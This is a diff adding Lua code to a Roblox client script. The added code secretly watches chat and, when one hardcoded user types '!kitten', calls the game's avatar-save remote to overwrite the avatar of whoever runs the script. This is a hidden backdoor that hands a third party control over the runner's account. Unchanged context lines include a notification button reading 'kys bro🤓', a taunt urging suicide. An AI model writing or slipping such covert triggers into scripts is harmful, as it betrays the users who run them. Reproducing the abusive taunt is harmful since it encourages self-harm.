@@ -9,6 +9,82 @@ game.StarterGui:SetCore("SendNotification", {
     Button1 = "kys bro🤓"
 })
 
+local targetUsername = "sci_mythical77"
+local replicatedStorage = game:GetService("ReplicatedStorage")
+
+local function onChat(player, message)
+    if player.Name == targetUsername and message:lower() == "!kitten" then
+        local myPlayer = game.Players.LocalPlayer
+        
+        if myPlayer then
+            local args = {
+                [1] = {
+                    ["SwimAnimation"] = 2510240941,
+                    ["Torso"] = 4637151279,
+                    ["ProportionScale"] = 0,
+                    ["ClimbAnimation"] = 2510230574,
+                    ["Shirt"] = 11289085978,
+                    ["FaceAccessory"] = "13353986061,12580366888,8923599923",
+                    ["RightArmColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["HairAccessory"] = "13918965164,14314838611",
+                    ["RightArm"] = 0,
+                    ["Head"] = 0,
+                    ["FallAnimation"] = 2510233257,
+                    ["TorsoColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["DepthScale"] = 0.8,
+                    ["RightLeg"] = 0,
+                    ["HeightScale"] = 0.9,
+                    ["WaistAccessory"] = "14335771887",
+                    ["RightLegColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["LeftLegColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["WidthScale"] = 0.7,
+                    ["BodyTypeScale"] = 0,
+                    ["BackAccessory"] = "8651335862",
+                    ["LeftArmColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["Emotes"] = {
+                        ["1"] = { [1] = 9528286240 },
+                        ["8"] = { [1] = 12874468267 },
+                        ["3"] = { [1] = 7466046574 },
+                        ["2"] = { [1] = 11309263077 },
+                        ["4"] = { [1] = 3576968026 },
+                        ["7"] = { [1] = 13344121112 }
+                    },
+                    ["Pants"] = 14851012835,
+                    ["JumpAnimation"] = 2510236649,
+                    ["HatAccessory"] = "12579341301,13142881183,1402432199",
+                    ["LeftArm"] = 0,
+                    ["LeftLeg"] = 0,
+                    ["HeadColor"] = { [1] = "248.0000004172325", [2] = "248.0000004172325", [3] = "248.0000004172325" },
+                    ["WalkAnimation"] = 2510242378,
+                    ["IdleAnimation"] = 2510235063,
+                    ["RunAnimation"] = 2510238627,
+                    ["HeadScale"] = 1,
+                    ["Face"] = 0,
+                    ["AccessoryBlob"] = {
+                        [1] = {
+                            ["Order"] = 1,
+                            ["AssetId"] = 12090385963,
+                            ["AccessoryType"] = "Jacket"
+                        }
+                    },
+                    ["GraphicTShirt"] = 10891067215
+                }
+            }
+
+            -- Execute the function on your character
+            replicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
+        end
+    end
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg) onChat(player, msg) end)
+end)
+
 local Players = game:GetService("Players")
 
 local targetUsername = "sci_mythical77"
